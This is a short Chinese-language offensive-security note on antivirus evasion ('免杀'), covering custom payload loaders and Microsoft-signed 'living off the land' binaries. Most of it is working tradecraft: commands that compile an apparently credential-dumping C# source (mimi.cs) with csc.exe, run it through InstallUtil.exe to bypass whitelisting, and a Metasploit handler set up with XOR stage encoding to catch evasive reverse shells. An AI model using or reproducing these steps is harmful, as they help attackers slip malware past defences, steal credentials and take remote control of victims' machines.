# 免杀

0 bookmark tool/avbypass

1 自己写一个加载器，分离免杀

国内杀软的免杀其实还是非常简单直接的，关键在于回连了之后的很多操作依然被hook。

不一定要依赖，其实自己写代码调api就行。

2 使用微软自己的程序   white list : lolbas-project.github.io

C# .net 为什么是神 （误。

```
csc.exe + InstallUtil.exe

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe /keyfile:C:\Users\Johnn\Desktop\installutil.snk /unsafe C:\Users\Johnn\Desktop\mimi.cs

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Johnn\Desktop\Micropoor.exe

msf exploit(multi/handler) > set exitonsession false 
exitonsession => false
msf exploit(multi/handler) > set EnableStageEncoding true
EnableStageEncoding => true
msf exploit(multi/handler) >
msf exploit(multi/handler) > set Stageencoder x64/xor 
Stageencoder => x64/xor
msf exploit(multi/handler) > set stageencodingfallback false
stageencodingfallback => false
msf exploit(multi/handler) > exploit -j -z
```
